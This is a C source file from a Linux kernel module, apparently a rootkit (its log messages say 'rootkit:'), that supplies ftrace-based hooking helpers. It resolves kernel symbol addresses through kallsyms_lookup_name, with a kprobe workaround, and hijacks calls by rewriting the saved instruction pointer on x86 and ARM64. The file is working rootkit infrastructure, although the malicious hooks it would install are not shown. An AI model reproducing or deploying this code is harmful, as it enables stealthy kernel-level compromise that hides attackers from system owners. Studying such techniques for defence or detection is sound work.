#include "ftrace_helper.h"

/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name()
 * to find the address in kernel memory.
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long *)hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long *)hook->original) = hook->address;
#endif

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    if (!regs)
    {
        printk(KERN_ERR "rootkit: Failed to retrieve regs\n");
        return;
    }

    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    // Debug information
    // printk(KERN_DEBUG "rootkit: Original ip: 0x%lx, parent_ip: 0x%lx, hook addr: 0x%lx\n",
        //    ip, parent_ip, (unsigned long)hook->function);

#if USE_FENTRY_OFFSET
#ifdef CONFIG_ARM64
    regs->pc = (unsigned long)hook->function;
#else
    regs->ip = (unsigned long)hook->function;
#endif
#else
    if (!within_module(parent_ip, THIS_MODULE))
    {
#ifdef CONFIG_ARM64
        regs->pc = (unsigned long)hook->function;
#else
        regs->ip = (unsigned long)hook->function;
#endif
    }
#endif
}

int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if (err)
        return err;

    /* For many of function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning it OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = fh_ftrace_thunk;
#ifdef CONFIG_ARM64
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS_IF_SUPPORTED | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
#else
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
#endif // hook->ops.flags = FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_SAVE_REGS_IF_SUPPORTED;

    // err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    err = ftrace_set_filter(&hook->ops, (unsigned char *)hook->name, strlen(hook->name), 0);

    if (err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err)
    {
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if (err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    // err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    err = ftrace_set_filter(&hook->ops, NULL, 0, 1);

    if (err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0; i < count; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}
